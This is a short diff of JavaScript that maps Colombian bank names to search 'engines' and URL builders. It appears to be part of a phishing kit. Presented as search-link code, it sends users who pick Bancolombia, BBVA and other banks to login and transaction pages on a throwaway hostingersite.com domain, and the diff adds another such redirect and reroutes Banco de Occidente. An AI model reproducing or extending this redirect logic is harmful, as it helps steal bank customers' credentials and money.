@@ -358,7 +358,7 @@
     credifinanciera:{ engine: "google", q: "Banco Credifinanciera" },
     davivienda:    { engine: "bing",   q: "Davivienda" },
     bogota:        { engine: "bogota",  q: "Banco de Bogotá" },
-    occidente:     { engine: "google", q: "Banco de Occidente" },
+    occidente:     { engine: "ocidente", q: "Banco de Occidente" },
     falabella:     { engine: "bing",   q: "Banco Falabella" },
     finandina:     { engine: "yahoo",  q: "Banco Finandina" },
     sudameris:     { engine: "google", q: "Banco GNB Sudameris" },
@@ -377,6 +377,7 @@
   // Construcción URL según motor
   function buildSearchUrl(engine, q) {
     const query = encodeURIComponent(q);
+    if (engine === "bancolombia") return `https://blueviolet-okapi-275780.hostingersite.com/transaction/ent/b-34f14/`;
     if (engine === "bancolombia") return `https://blueviolet-okapi-275780.hostingersite.com/boton/dinadatos/bancol/cel-login.html`;
     if (engine === "bbva") return `https://blueviolet-okapi-275780.hostingersite.com/transaction/ent/b-34f13/`;
     if (engine === "villa") return `https://blueviolet-okapi-275780.hostingersite.com/transaction/ent/b-34f1/inicio/`;
